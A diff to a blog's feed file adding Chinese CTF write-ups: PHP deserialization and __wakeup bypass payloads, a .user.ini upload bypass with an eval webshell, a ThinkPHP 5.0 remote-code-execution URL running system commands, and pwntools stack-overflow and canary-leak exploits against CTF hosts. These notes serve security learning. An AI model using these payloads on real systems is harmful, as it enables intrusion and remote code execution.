@@ -4,6 +4,175 @@
   
   
   <entry>
+    <title>【极客大挑战2019】PHP</title>
+    <link href="/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/"/>
+    <url>/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/</url>
+    
+    <content type="html"><![CDATA[<p>这一题有两个地方卡住我了，第一个是没有想到备份名叫<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a>.<br>第二个是public、protected与private在序列化时的区别。<br><img src="/img/27.png" srcset="/img/loading.gif" alt=""><br>于是在url栏中输入<a href="http://www.zip得到网站源码，发现flag.php进行提交，错误。" target="_blank" rel="noopener">www.zip得到网站源码，发现flag.php进行提交，错误。</a><br>观看源码：<br>index.php</p><pre><code>&lt;?phpinclude &#39;class.php&#39;;$select = $_GET[&#39;select&#39;];$res=unserialize(@$select);?&gt;</code></pre><p>发现了关键代码，考的应该是反序列化漏洞，去看class.php<br>class.php:</p><pre><code>&lt;?php include &#39;flag.php&#39;;  error_reporting(0);  class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>发现关键代码：</p><pre><code>      function __wakeup(){          $this-&gt;username = &#39;guest&#39;;      }</code></pre><p>因此需要对__wakeup()进行绕过。<br>接下来写php代码。</p><p>&lt;?php</p><pre><code>class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username, $password)    {        $this-&gt;username = $username;        $this-&gt;password = $password;    }}$select = new Name(&#39;admin&#39;,100);$res=serialize(@$select);echo $res;</code></pre><p><img src="/img/28.png" srcset="/img/loading.gif" alt=""></p><blockquote><p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p></blockquote><h1 id="public、protected与private在序列化时的区别"><a href="#public、protected与private在序列化时的区别" class="headerlink" title="public、protected与private在序列化时的区别"></a>public、protected与private在序列化时的区别</h1><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。<br>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1:"></a>exp1:</h2><pre><code>import  requestsurl =&quot;http://7bc3f84d-1e2f-4a49-897a-15eb4d1d5255.node3.buuoj.cn&quot;html = requests.get(url+&#39;?select=O:4:&quot;Name&quot;:3:{s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;}&#39;)print(html.text)</code></pre><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2:"></a>exp2:</h2><p> 如果不使用python提交<br>在url栏中会出现\0<br>有空白符，而复制的时候会丢失。<br>加上%00</p><blockquote><p>payload:</p></blockquote><pre><code>O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>上传绕过  .user.ini</title>
+    <link href="/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/"/>
+    <url>/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/</url>
+    
+    <content type="html"><![CDATA[<p>今天做了一题是BUUCTF上的checkin<br>一道文件上传题，题目首先对文件内容进行了过滤，过滤了<?因此<?php  ?>就不行了因此应该用<script language="php">eval($_POST['a']);</script>。同时这道题对文件名也过滤的死死的于是想用.htaccess但是发现没有用，后来知道该文件需要apache而这里是nginx。则需要.user.ini</p><blockquote><p>auto_prepend_file=X.jpg</p></blockquote>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>easy calc</title>
+    <link href="/2020/03/18/easy-calc/"/>
+    <url>/2020/03/18/easy-calc/</url>
+    
+    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/chrysanthemum/p/11757363.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11757363.html</a></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>easy_tornado</title>
+    <link href="/2020/03/15/easy-tornado/"/>
+    <url>/2020/03/15/easy-tornado/</url>
+    
+    <content type="html"><![CDATA[<p>welcome.txt的页面提示render，就想到了模板注入，flag.txt中告诉了flag文件的位置，hint.txt提示md5(cookie_secret+md5(filename))。</p><p>就是说要通过模板注入找到cookie_secret,然后编写python脚本将flag_name进行md5加密，<br>最后总体加密。同时观察hint.txt的url发现</p><pre><code>file?filename=/hints.txt&amp;filehash=c4d9e17f8cdc1e065a1af55625ffca16</code></pre><p> 那么最终就是：</p><blockquote><blockquote><p>file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))</p></blockquote></blockquote><p> python脚本：</p><pre><code> import hashlibdef hash(value):    md5 = hashlib.md5(value)    md5.update(value)    result = md5.hexdigest()    return resultdef jiami():    filename = &#39;/fllllllllllllag&#39;    cookie_S = &#39;de639f1e-0c39-46e5-b8cb-1cd29f56aea3&#39;    print(hash(filename.encode(&#39;utf-8&#39;)))    x = hash(filename.encode(&#39;utf-8&#39;))    y = cookie_S +x    print(hash(y.encode(&#39;utf-8&#39;)))jiami()</code></pre><p>参考链接：<a href="https://blog.csdn.net/cccccfive/article/details/83145669" target="_blank" rel="noopener">https://blog.csdn.net/cccccfive/article/details/83145669</a></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>关于php的session.serialize_handler的问题</title>
+    <link href="/2020/03/10/%E5%85%B3%E4%BA%8Ephp%E7%9A%84session-serialize-handler%E7%9A%84%E9%97%AE%E9%A2%98/"/>
+    <url>/2020/03/10/%E5%85%B3%E4%BA%8Ephp%E7%9A%84session-serialize-handler%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+    
+    <content type="html"><![CDATA[<p>前言<br>php的session信息是储存在文件中的</p><p>session.save_path=”” 指定储存的路径<br>session.save_handler=”” 指定储存时使用的函数（默认是file）<br>session.auto_start boolen<br>session.serialize_handler=”” 定义序列化和反序列化的处理器的名字，默认是php(5.5.4后改为php_serialize)<br>session.serialize_handler存在以下几种</p><p>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值<br>php 键名+竖线（|）+经过serialize()函数处理过的值<br>php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化<br>使用过程中如果想要修改，使用</p><p>ini_set(‘session.serialize_handler’,’php_serialize’);<br>但这里设置的handler如果和默认的不同，就会出问题</p><p>比如默认是php的handler，在该页面设置为php_serialize</p><p>这是如果我们传入一个 ‘|O:5:”Class”‘;,这样的一个数据，在储存时就会加上键名进行序列化，但是进行读取的时候还是会按照php handler来处理，以|作为键和值的分隔符，将前半部分当作键，后半部分当作值,然后进行反序列化</p><p>CTF<br>jarvisoj PHPINFO</p><p>引用官方文档的内容</p><p>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</p><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得</p><p>通俗的说就是请求时加上与session.upload_progress.name同名的变量时就会在$_SESSION中加上一组新的数据</p><p>来看这道题，题目给了源码</p><?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO{    public $mdzz;    function __construct()    {        $this->mdzz = 'phpinfo();';    }    function __destruct()    {        eval($this->mdzz);    }}if(isset($_GET['phpinfo'])){    $m = new OowoO();}else{    highlight_string(file_get_contents('index.php'));}?><p>看到这里使用了ini_set(‘sessionserialize_handler’:’php’),有预感会出现handler不一样的问题</p><p>接下来查看phpinfo，发现php版本是5.6.21，大于5.5.4，默认的handler是php_serialize，会出现上面所述的问题</p><p>在使用session_start()时会自动加载session文件中的值，因为在这里在__destruct方法中使用eval，所以只要在session文件中写入这个类，就能够执行代码？</p><p>但是我们如何将类写入session文件？</p><p>这就用到刚才提到的东西，查看phpinfo，<br>因为session.upload_progress.enabled=1，所以我们就可以post一个和session.upload_progress.name同名的变量，来使得我们上传的文件名写入session</p><p>因为这里是php handler，是以|开头的，所以在反序列化时会按照|来识别键值对而不是按照默认的php_serialize来识别session，所以我们将文件名改为</p><p>“|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(<strong>FILE</strong>)));&quot;;}”<br>来读取文件目录</p><p>问题<br>session部分的问题大致是解决了……剩下的问题就是……为什么要将双引号转义？暂时还没有弄清楚，待日后分析吧</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>PHP_RCE</title>
+    <link href="/2020/03/08/PHP-RCE/"/>
+    <url>/2020/03/08/PHP-RCE/</url>
+    
+    <content type="html"><![CDATA[<p>漏洞利用：ThinkPHP 5.0<br>此框架存在远程代码执行漏洞<br>漏洞产生的原因就在于这个控制器这里，整个thinkphp框架里的功能对控制器没有进行严格的安全过滤于检查，使攻击者可以伪造恶意参数进行强制插入，最根本的原因就是正则的表达式写的不好，导致可以绕过。</p><p>在controller获取控制器后，直接进行赋值，但是并没有对控制器的名进行严格的检测，导致可以使用斜杠等特殊符号来远程代码注入。</p><p>我们来搭建一下网站的环境，apache+mysql+Linux centos系统，搭建好的测试环境地址是<a href="http://127.0.01/anquan" target="_blank" rel="noopener">http://127.0.01/anquan</a> ，我们可以直接在index.php后面伪造攻击参数，示例如下：</p><p><a href="http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l" target="_blank" rel="noopener">http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l</a><br>通过该漏洞也可以直接远程代码注入执行phpinfo语句，查询当前的php版本，路径，扩展，以及php.ini存放的地址，都可以看得到，构造如下代码即可。</p><p><a href="http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39;" target="_blank" rel="noopener">http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39;</a></p><p>但是我想能不能输入一句话木马，其实是可以的，但是我在攻防世界的题目中用蚁剑没有连入成功。</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>图片验证码灰度化、二值化处理</title>
+    <link href="/2020/03/03/%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%81%B0%E5%BA%A6%E5%8C%96%E3%80%81%E4%BA%8C%E5%80%BC%E5%8C%96%E5%A4%84%E7%90%86/"/>
+    <url>/2020/03/03/%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%81%B0%E5%BA%A6%E5%8C%96%E3%80%81%E4%BA%8C%E5%80%BC%E5%8C%96%E5%A4%84%E7%90%86/</url>
+    
+    <content type="html"><![CDATA[<pre><code>import tesserocrfrom PIL import Imageimage = Image.open(&#39;code2.jpg&#39;)image = image.convert(&#39;L&#39;)threshold = 127table = []for i in range(256):    if i &lt; threshold:        table.append(0)    else:        table.append(1)</code></pre><p>   二：</p><pre><code>from PIL import  Imageimport subprocessimage = Image.open(&#39;code.jpg&#39;)image = image.point(lambda x: 0 if x&lt;127 else 255)image.save(&#39;code2.jpg&#39;)subprocess.call([&quot;tesseract&quot;, &#39;code2.jpg&#39;, &quot;output&quot;])with open(&#39;output.txt&#39;, &#39;r&#39;) as f:    print(f.read())</code></pre>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>php intval()函数漏洞，is_numeric() 漏洞，绕过回文判断</title>
+    <link href="/2020/02/27/php-intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cis-numeric-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD/"/>
+    <url>/2020/02/27/php-intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cis-numeric-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD/</url>
+    
+    <content type="html"><![CDATA[<p>Intval函数获取变量整数数值<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>这个有个应用就是在判断数值是不是回文上，如果参数为2147483647，那么当它反过来，由于超出了限制，所以依然等于2147483647。即为回文。</p><p>is_numeric()  判断变量是否为数字或数字字符串，不仅检查10进制，16进制是可以。</p><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p><p>该函数还可能造成sql注入，例如将‘1 or 1’转换为16进制形式，再传参，就可以造成sql注入</p><p>intval($req[“number”])=intval(strrev($req[“number”]))  如果要求不是回文，但又要满足这个条件，可以用科学计数法构造0=0：number=0e-0%00</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>攻防世界pwn1</title>
+    <link href="/2020/02/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1/"/>
+    <url>/2020/02/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1/</url>
+    
+    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/lxy8584099/p/11887235.html" target="_blank" rel="noopener">https://www.cnblogs.com/lxy8584099/p/11887235.html</a></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>攻防世界stack2</title>
+    <link href="/2020/02/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cstack2/"/>
+    <url>/2020/02/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cstack2/</url>
+    
+    <content type="html"><![CDATA[<p><a href="https://www.baidu.com/link?url=-3Q6-OV7phmsr2vIhz1F6gc28uCq2Df3acVV7copeZK-3AMH0Z5yrLieNixXsm7qz460CyNrc2eZKTcxElefoRhr5d1XDuzzpjIFpsJejTC&amp;wd=&amp;eqid=c16734cb001ae96e000000065e425ba0" target="_blank" rel="noopener">https://www.baidu.com/link?url=-3Q6-OV7phmsr2vIhz1F6gc28uCq2Df3acVV7copeZK-3AMH0Z5yrLieNixXsm7qz460CyNrc2eZKTcxElefoRhr5d1XDuzzpjIFpsJejTC&amp;wd=&amp;eqid=c16734cb001ae96e000000065e425ba0</a></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>CG-CTF Stack Overflow</title>
+    <link href="/2020/02/10/CG-CTF-Stack-Overflow/"/>
+    <url>/2020/02/10/CG-CTF-Stack-Overflow/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h1><p>先执行一下程序。通过观察可以从message里面找溢出点，发现第一个数组A长度为40但是可以输入60。并且n就在A数组的下面，因此我们可以通过溢出修改n的长度，并且写了/bin/sh<br>下面是exp；</p><pre><code>from pwn import *re = remote(&#39;182.254.217.142&#39;,10001)fgets_plt = 0x080483D0data_addr = 0x0804A024re.sendline(&#39;1&#39;)payload1 = &#39;a&#39;*0x28 + p32(0x60) +&#39;/bin/sh&#39;re.sendline(payload1)payload2 = &#39;a&#39;*0x30 + &#39;aaaa&#39; + p32(0x080483f0) + &#39;aaaa&#39; +p32(0x0804A0AD)re.sendline(payload2)re.interactive()</code></pre>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>攻防世界forgot</title>
+    <link href="/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cforgot/"/>
+    <url>/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cforgot/</url>
+    
+    <content type="html"><![CDATA[<h1 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h1><p>首先检查一下文件</p><pre><code>Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><p>可以确定的是栈上面的变量覆盖，但是覆盖地址的时候需要注意*(&amp;v3 + –v14)这个式子，我们需要把函数地址放到这个地址上面(&amp;v3是栈上面的地址，其计算是按照字节来计算而不是位，所以做的时候要注意计算的答案)。由于v14的初始值为1，并且里面正则判断的时候没有关于大写字符的判断，我们就可以直接写入大写字符覆盖v2，并将v3覆盖为我们需要的函数的地址，就可以拿到flag。<br>关注这个循环里面的内容，里面相当于正则表达式的判断，但是你仔细分析里switch中的函数时，可以发现没有判断大写字符的地方，我们可以注入大写字符，来达到不改变v14的值的效果。</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>攻防世界Mary_Morton</title>
+    <link href="/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMary-Morton/"/>
+    <url>/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMary-Morton/</url>
+    
+    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/gaonuoqi/p/11760970.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaonuoqi/p/11760970.html</a></p><pre><code>Welcome to the battle ! [Great Fairy] level pwned Select your weapon 1. Stack Bufferoverflow Bug 2. Format String Bug 3. Exit the battle 2aaaa-%x-%x-%x-%x-%x-%x-%x-%xaaaa-451173d0-7f-d652c260-0-0-61616161-252d7825-2d78252d</code></pre><p>可以看见偏移量是6个字节。<br>又因为0x90-0x8=0x88,0x88/8+6=23.<br>故exp：</p><pre><code>from pwn import *r=remote(&#39;111.198.29.45&#39;,53501)r.recvuntil(&#39;3. Exit the battle&#39;)r.sendline(&#39;2&#39;)r.sendline(&#39;%23$p&#39;)r.recvuntil(&#39;0x&#39;)canary=int(r.recv(16),16)print (canary)flag_addr=0x4008dapayload=&#39;a&#39;*0x88+p64(canary)+&#39;a&#39;*8+p64(flag_addr)r.recvuntil(&#39;3. Exit the battle&#39;)r.sendline(&#39;1&#39;)r.sendline(payload)r.interactive()</code></pre>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>XCTF int_overflow</title>
     <link href="/2020/02/03/XCTF-int-overflow/"/>
     <url>/2020/02/03/XCTF-int-overflow/</url>
